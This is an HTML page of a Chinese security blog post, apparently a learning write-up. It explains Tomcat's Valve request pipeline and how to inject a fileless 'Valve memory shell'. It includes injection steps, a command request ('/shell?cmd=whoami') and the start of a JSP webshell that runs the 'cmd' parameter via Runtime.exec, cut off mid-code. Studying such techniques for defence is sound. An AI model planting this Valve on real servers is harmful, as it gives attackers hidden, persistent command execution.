@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Tomcat Valve内存马">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/27/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BTomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251023144510887.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250621094726-ge4ciuh.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251023151912508.png">
+<meta property="article:published_time" content="2025-10-27T09:11:42.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:33:24.180Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20251023144510887.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/27/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BTomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/27/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BTomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/10/27/Java攻防/Java安全之Tomcat-Valve内存马/","title":"Java安全之Tomcat Valve内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Tomcat Valve内存马 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Tomcat Valve内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Valve%E6%9C%BA%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">1. Valve机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Valve%E8%AE%A4%E8%AF%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 Valve认识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%A0%B8%E5%BF%83%E8%AE%BE%E8%AE%A1%EF%BC%9A%E2%80%9C%E7%AE%A1%E9%81%93-%E9%98%80%E9%97%A8%E2%80%9D%EF%BC%88Pipeline-Valve%EF%BC%89%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 核心设计：“管道 - 阀门”（Pipeline-Valve）模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%B1%82%E7%BA%A7%E7%BB%93%E6%9E%84%EF%BC%9A%E4%BB%8E%E8%AF%B7%E6%B1%82%E5%85%A5%E5%8F%A3%E5%88%B0-Servlet-%E7%9A%84%E5%AE%8C%E6%95%B4%E9%93%BE%E8%B7%AF"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 层级结构：从请求入口到 Servlet 的完整链路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Connector%EF%BC%88%E8%BF%9E%E6%8E%A5%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">1. Connector（连接器）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Engine%EF%BC%88%E5%BC%95%E6%93%8E%EF%BC%89"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">2. Engine（引擎）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Host%EF%BC%88%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%EF%BC%89"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">3. Host（虚拟主机）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Context%EF%BC%88Web-%E5%BA%94%E7%94%A8%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%89"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">4. Context（Web 应用上下文）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-Wrapper%EF%BC%88Servlet-%E5%8C%85%E8%A3%85%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.3.5.</span> <span class="nav-text">5. Wrapper（Servlet 包装器）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%AE%8C%E6%95%B4%E9%93%BE%E8%B7%AF"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 完整链路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Vlave%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.</span> <span class="nav-text">2. Vlave内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 调试分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91%E8%AF%B4%E6%98%8E%EF%BC%88Context-%E5%B1%82%E7%BA%A7%EF%BC%89"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 注入逻辑说明（Context 层级）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">1.2.4.</span> <span class="nav-text">2.4 完整代码</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/27/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BTomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Tomcat Valve内存马 | 子非鱼的博客">
+      <meta itemprop="description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流程。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Tomcat Valve内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-27 17:11:42" itemprop="dateCreated datePublished" datetime="2025-10-27T17:11:42+08:00">2025-10-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:33:24" itemprop="dateModified" datetime="2025-10-31T17:33:24+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置/后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流程。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>Tomcat Valve内存马</h1>
+<h2 id="1-Valve机制">1. Valve机制</h2>
+<h3 id="1-1-Valve认识">1.1 Valve认识</h3>
+<p>可以把 Tomcat 里的 Valve 理解成<strong>请求处理流程中的 “自定义插件”</strong>—— 它能在请求到达 Servlet 之前，插入一段自己的逻辑（比如日志记录、权限校验，甚至是恶意代码）。每个 Valve 只负责一件事，多个 Valve 按顺序组合起来，就形成了 Tomcat 对请求的 “流水线式” 处理。</p>
+<h3 id="1-2-核心设计：“管道-阀门”（Pipeline-Valve）模式">1.2 核心设计：“管道 - 阀门”（Pipeline-Valve）模式</h3>
+<p>Tomcat 的请求处理链路本质上是一个 “责任链模式” 的实现，而 Pipeline（管道）和 Valve（阀门）是这个模式的具体载体：</p>
+<ul>
+<li>
+<p><strong>Pipeline（管道）</strong>：可以理解为一个 “容器”，内部按顺序存放多个 Valve（阀门），并规定了 Valve 的执行顺序。每个层级（如 Engine、Host 等）都有且仅有一个 Pipeline。</p>
+</li>
+<li>
+<p><strong>Valve（阀门）</strong>：是具体的 “处理器”，每个 Valve 负责完成一项特定的功能（如编码转换、权限校验、日志记录等）。一个 Pipeline 中可以有多个 Valve，它们按添加顺序依次执行。</p>
+</li>
+<li>
+<p><strong>基础阀门（Basic Valve）</strong>：每个 Pipeline 必须有一个 “基础阀门”（由 Tomcat 内部默认实现），它是 Pipeline 中最后执行的 Valve，负责将请求传递到下一层级的 Pipeline（或最终的 Servlet）。例如，Wrapper 层级的基础阀门会调用 Servlet 的 <code>service()</code> 方法。</p>
+</li>
+</ul>
+<h3 id="1-3-层级结构：从请求入口到-Servlet-的完整链路">1.3 层级结构：从请求入口到 Servlet 的完整链路</h3>
+<p>Tomcat 的请求处理链路分为 5 个核心层级，每个层级对应一个组件，每个组件都有自己的 Pipeline 和 Valve。请求会从顶层逐级向下传递，具体层级如下：</p>
+<p><img src="/images/image-20251023144510887.png" alt="image-20251023144510887"></p>
+<h4 id="1-Connector（连接器）">1. Connector（连接器）</h4>
+<ul>
+<li><strong>作用</strong>：接收客户端请求（如 HTTP 协议的 8080 端口），将原始字节流解析为 Tomcat 内部的 <code>Request</code> 和 <code>Response</code> 对象。</li>
+<li><strong>Pipeline 特点</strong>：Connector 的 Pipeline 主要处理协议解析（如 HTTP 转 Tomcat 内部对象）、连接管理等底层逻辑，是请求进入 Tomcat 容器的‘第一关，其 Pipeline 中的 Valve 主要处理与协议相关的底层逻辑（如 SSL 解密、请求头解析等）。</li>
+</ul>
+<h4 id="2-Engine（引擎）">2. Engine（引擎）</h4>
+<ul>
+<li><strong>作用</strong>：Tomcat 的顶层容器，负责管理多个 Host（虚拟主机），并将请求转发到对应的 Host。</li>
+<li><strong>Pipeline 特点</strong>：Engine 的 Pipeline 处理所有虚拟主机共有的逻辑（如全局日志、跨主机的权限控制等）。</li>
+</ul>
+<h4 id="3-Host（虚拟主机）">3. Host（虚拟主机）</h4>
+<ul>
+<li><strong>作用</strong>：对应一个虚拟主机（如 <code>localhost</code> 或自定义域名），负责管理多个 Context（Web 应用），将请求转发到对应的 Context。</li>
+<li><strong>Pipeline 特点</strong>：Host 的 Pipeline 处理当前虚拟主机特有的逻辑（如主机级别的访问控制、域名相关的过滤等）。</li>
+</ul>
+<h4 id="4-Context（Web-应用上下文）">4. Context（Web 应用上下文）</h4>
+<ul>
+<li><strong>作用</strong>：对应一个部署在 Tomcat 中的 Web 应用（如 <code>ROOT</code> 应用或 <code>test.war</code> 解压后的应用），负责管理多个 Wrapper（Servlet 包装器）。</li>
+<li><strong>Pipeline 特点</strong>：Context 的 Pipeline 是开发者最常接触的层级之一，其 Valve 会处理当前 Web 应用的通用逻辑（如会话管理、应用级别的权限校验等）。<strong>关键</strong>：Context 的 Pipeline 执行优先级高于 Web 应用中的 Filter 链（即 Valve 比 Filter 更早拦截请求）。</li>
+</ul>
+<h4 id="5-Wrapper（Servlet-包装器）">5. Wrapper（Servlet 包装器）</h4>
+<ul>
+<li><strong>作用</strong>：对应一个具体的 Servlet（如 <code>HelloServlet</code>），是请求处理的最终执行者。</li>
+<li><strong>Pipeline 特点</strong>：Wrapper 的 Pipeline 处理与当前 Servlet 相关的逻辑（如 Servlet 初始化检查、请求参数验证等），其基础阀门会直接调用 Servlet 的 <code>service()</code> 方法。</li>
+</ul>
+<h3 id="1-4-完整链路">1.4 完整链路</h3>
+<p><img src="/images/image-20250621094726-ge4ciuh.png" alt="image-20250621094726-ge4ciuh"></p>
+<p>当请求到达 Tomcat 后，会严格按照 <strong>“Engine Pipeline → Host Pipeline → Context Pipeline → Wrapper Pipeline”</strong> 的顺序流转，每一层的 Pipeline 都通过 Valve 接力传递请求：</p>
+<ol>
+<li>
+<p><em>请求经 Connector 解析后，进入 Engine 的 Pipeline</em>，依次执行所有自定义 Valve → 执行 Engine 的 Basic Valve，将请求传给匹配的 Host 的 Pipeline；</p>
+</li>
+<li>
+<p>请求进入 Host 的 Pipeline，依次执行所有自定义 Valve → 执行 Host 的 Basic Valve，将请求传给匹配的 Context 的 Pipeline；</p>
+</li>
+<li>
+<p>请求进入 Context 的 Pipeline，依次执行所有自定义 Valve（<strong>这里的 Valve 执行优先级高于 Filter 链</strong>）→ 执行 Context 的 Basic Valve，将请求传给匹配的 Wrapper 的 Pipeline；</p>
+</li>
+<li>
+<p>请求进入 Wrapper 的 Pipeline，依次执行所有自定义 Valve → 执行 Wrapper 的 Basic Valve，调用 Filter 链 → 最终调用 Servlet 的 <code>service()</code> 方法处理业务。</p>
+</li>
+</ol>
+<h2 id="2-Vlave内存马">2. Vlave内存马</h2>
+<h3 id="2-1-调试分析">2.1 调试分析</h3>
+<p>了解valve的机制后, 新建一个项目, 然后断点调试分析.</p>
+<p><img src="/images/image-20251023151912508.png" alt="image-20251023151912508"></p>
+<p>从这个堆栈可以清晰看到 <strong>Valve 在请求链路中的 “分层拦截” 作用</strong>：</p>
+<ul>
+<li><strong>每个层级都有专属 Valve</strong>：Engine、Host、Context、Wrapper 各层级都有对应的 Valve（如 <code>StandardEngineValve</code>、<code>StandardHostValve</code> 等），它们按 “从上到下” 的顺序拦截请求，完成各自的功能。</li>
+<li><strong>Valve 是请求流转的 “接力棒”</strong>：每个层级的 Valve 执行完自身逻辑后，会通过 <code>getNext().invoke(request, response)</code> 把请求传递给下一个 Valve（或基础阀门），最终到达 Servlet。</li>
+<li><strong>Valve 比 Filter 更早执行</strong>：Context 层级的 Valve（如 <code>StandardContextValve</code>）执行优先级高于 Web 应用中的 Filter 链，这也是 Valve 内存马能 “抢先拦截请求” 的关键。</li>
+</ul>
+<h3 id="2-2-注入原理">2.2 注入原理</h3>
+<p>Tomcat 的 <code>Pipeline</code> 接口提供了 <strong><code>addValve(Valve valve)</code></strong> 方法，允许在运行时向任意层级（Engine、Host、Context、Wrapper）的 Pipeline 中添加新的 Valve：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line"></span><br><span class="line">    Valve[] getValves();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这意味着：</p>
+<ul>
+<li><strong>无需重启服务</strong>；</li>
+<li><strong>无需修改配置文件（如 server.xml）</strong>；</li>
+<li><strong>无需部署新 WAR 包</strong>；</li>
+<li>只要能执行任意 Java 代码（例如通过已有 WebShell），就能动态插入自定义 Valve。</li>
+</ul>
+<p>了解这个过程, 就可以考虑在这个过程中注入内存马</p>
+<p>Valve 内存马<strong>可以注入到 Tomcat 的不同层级</strong>（Engine、Host、Context、Wrapper），不同层级的注入会影响攻击范围和隐蔽性：</p>
+<table>
+<thead>
+<tr>
+<th>注入层级</th>
+<th>攻击范围</th>
+<th>隐蔽性</th>
+<th>典型场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Engine</td>
+<td>全局所有虚拟主机和应用</td>
+<td>低（影响面大）</td>
+<td>批量控制多应用服务器</td>
+</tr>
+<tr>
+<td>Host</td>
+<td>单个虚拟主机下的所有应用</td>
+<td>中</td>
+<td>控制特定域名下的所有 Web 应用</td>
+</tr>
+<tr>
+<td><strong>Context</strong></td>
+<td>单个 Web 应用</td>
+<td>高（精准）</td>
+<td>隐蔽控制目标应用</td>
+</tr>
+<tr>
+<td>Wrapper</td>
+<td>单个 Servlet</td>
+<td>极高</td>
+<td>针对特定接口的精准攻击</td>
+</tr>
+</tbody>
+</table>
+<p>Valve 内存马实现逻辑（以 Context 层级为例）</p>
+<h3 id="2-3-注入逻辑说明（Context-层级）">2.3 注入逻辑说明（Context 层级）</h3>
+<ol>
+<li><strong>获取当前请求的 <code>Request</code> 对象</strong><br>
+JSP 中可通过内置对象 <code>request</code> 获取（实际类型为 <code>org.apache.catalina.connector.RequestFacade</code>）。</li>
+<li><strong>通过反射获取底层 <code>Request</code> 和 <code>Context</code></strong>
+<ul>
+<li><code>RequestFacade</code> 是包装类，需反射获取其内部的 <code>request</code> 字段；</li>
+<li>从 <code>Request</code> 中调用 <code>getContext()</code> 获取 <code>StandardContext</code>。</li>
+</ul>
+</li>
+<li><strong>动态定义恶意 Valve 类</strong><br>
+使用 <code>javax.tools.JavaCompiler</code> 在内存中编译 Java 源码（避免写文件），或直接通过字节码加载（此处为简化，使用动态类定义 + 反射实例化）。</li>
+<li><strong>将恶意 Valve 添加到 Context 的 Pipeline</strong><br>
+调用 <code>context.getPipeline().addValve(evilValve)</code> 完成注入。</li>
+<li><strong>后续请求将被恶意 Valve 拦截</strong><br>
+例如访问 <code>/shell?cmd=whoami</code> 即可执行命令。</li>
+</ol>
+<h3 id="2-4-完整代码">2.4 完整代码</h3>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveTest</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 